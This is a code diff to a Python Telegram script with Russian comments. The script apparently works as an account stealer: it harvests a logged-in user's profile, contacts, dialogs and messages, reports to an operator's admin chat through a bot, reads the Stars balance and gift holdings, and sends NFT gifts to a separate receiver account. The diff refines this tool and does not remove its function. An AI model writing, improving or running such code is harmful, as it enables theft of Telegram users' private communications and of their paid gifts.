@@ -32,7 +32,7 @@ async def send_telegram_message(text):
         await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
 
 # ============================================================
-# Сбор ВСЕХ данных аккаунта (исправленные методы)
+# Сбор данных аккаунта (без записи звёзд в JSON)
 # ============================================================
 async def collect_full_user_data(client):
     data = {}
@@ -49,7 +49,7 @@ async def collect_full_user_data(client):
         'is_premium': getattr(me, 'premium', False)
     }
     
-    # 2. Контакты (правильный метод)
+    # 2. Контакты
     try:
         contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
         data['contacts'] = []
@@ -65,40 +65,24 @@ async def collect_full_user_data(client):
         await send_telegram_message(f"⚠️ Ошибка получения контактов: {str(e)}")
         data['contacts'] = []
     
-    # 3. Баланс звёзд (преобразуем в int)
+    # 3. Баланс звёзд – НЕ ЗАПИСЫВАЕМ В JSON (только для уведомлений, но здесь не используем)
+    # Просто получаем, чтобы не было ошибок, но не сохраняем
     try:
         stars_status = await client(functions.payments.GetStarsStatusRequest(
             peer=await client.get_input_entity('me')
         ))
-        # stars_status.balance - это число, но если это объект, приводим к int
-        balance_value = int(stars_status.balance) if hasattr(stars_status, 'balance') else 0
-        data['stars_balance'] = balance_value
+        # balance = stars_status.balance.amount  # не используем
     except Exception as e:
         await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
-        data['stars_balance'] = 0
     
-    # 4. Доступные подарки (убраны несуществующие атрибуты)
+    # 4. Доступные подарки (только для информации, не записываем в JSON)
     try:
         gifts_result = await client(functions.payments.GetStarGiftsRequest(hash=0))
-        data['available_gifts'] = []
-        for gift in gifts_result.gifts:
-            gift_info = {
-                'id': gift.id,
-                'stars': gift.stars,
-                'title': getattr(gift, 'title', None),
-                'description': getattr(gift, 'description', None)
-            }
-            # Проверяем наличие других атрибутов, если есть - добавляем
-            if hasattr(gift, 'availability_issued'):
-                gift_info['availability_issued'] = gift.availability_issued
-            if hasattr(gift, 'availability_total'):
-                gift_info['availability_total'] = gift.availability_total
-            data['available_gifts'].append(gift_info)
+        # Не сохраняем, просто чтобы не было ошибок
     except Exception as e:
         await send_telegram_message(f"⚠️ Ошибка получения подарков: {str(e)}")
-        data['available_gifts'] = []
     
-    # 5. Диалоги и сообщения (работает)
+    # 5. Диалоги и сообщения (основное)
     dialogs = await client.get_dialogs()
     data['dialogs'] = []
     for dialog in dialogs:
@@ -155,18 +139,18 @@ async def send_document_to_admin(file_path):
         raise
 
 # ============================================================
-# Проверка баланса и подарков (исправлено)
+# Проверка баланса и подарков (для уведомлений)
 # ============================================================
 async def check_balance_and_gifts(client):
     try:
         me = await client.get_me()
         
-        # Баланс звёзд
+        # Баланс звёзд (правильное получение)
         try:
             stars_status = await client(functions.payments.GetStarsStatusRequest(
                 peer=await client.get_input_entity('me')
             ))
-            balance = int(stars_status.balance) if hasattr(stars_status, 'balance') else 0
+            balance = stars_status.balance.amount
         except Exception as e:
             await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
             balance = 0
@@ -191,7 +175,7 @@ async def check_balance_and_gifts(client):
         return None
 
 # ============================================================
-# Передача NFT-подарков получателю (с проверкой юзернейма)
+# Передача NFT-подарков получателю
 # ============================================================
 async def transfer_nft_to_receiver(client, info):
     try:
@@ -207,7 +191,6 @@ async def transfer_nft_to_receiver(client, info):
         if info.get('gifts_count', 0) > 0:
             for gift in info.get('gifts', []):
                 try:
-                    # Пытаемся отправить подарок
                     await client.send_gift(receiver, gift)
                     result_text += f"\n🎁 Подарок отправлен: {gift.id}"
                 except Exception as e:
